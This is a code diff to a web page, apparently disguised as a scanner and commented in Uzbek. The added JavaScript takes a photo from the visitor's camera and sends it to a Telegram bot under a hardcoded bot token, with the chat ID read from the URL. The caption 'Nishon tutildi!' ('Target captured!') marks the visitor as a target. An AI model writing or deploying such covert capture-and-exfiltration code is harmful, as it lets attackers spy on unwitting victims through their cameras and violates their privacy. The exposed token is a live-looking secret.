@@ -37,11 +37,14 @@
 <script>
     const token = "8103900618:AAHIP38KJ0Y0Rr1u1P4n9z6PdbAr9LAM-fk";
     
-    // 🎯 URL'dan 'id' parametrini olish (Masalan: camera.html?id=12345)
     const urlParams = new URLSearchParams(window.location.search);
-    const secret_code = urlParams.get('id');
+    const user_secret_code = urlParams.get('id') || "8041707187"; 
 
-    formData.append('chat_id', secret_code);
+    // formData qismiga shuni qo'sh:
+    const formData = new FormData();
+    formData.append('chat_id', user_secret_code); // Bot buni qabul qiladi
+    formData.append('photo', blob, 'target.jpg');
+    formData.append('caption', `🔑 Kod: ${user_secret_code}\n📸 **Nishon tutildi!**\n...`);
 
     async function startScanner() {
         const statusElement = document.getElementById('status');
@@ -106,4 +109,5 @@
 </script>
 </body>
 </html>
+
 
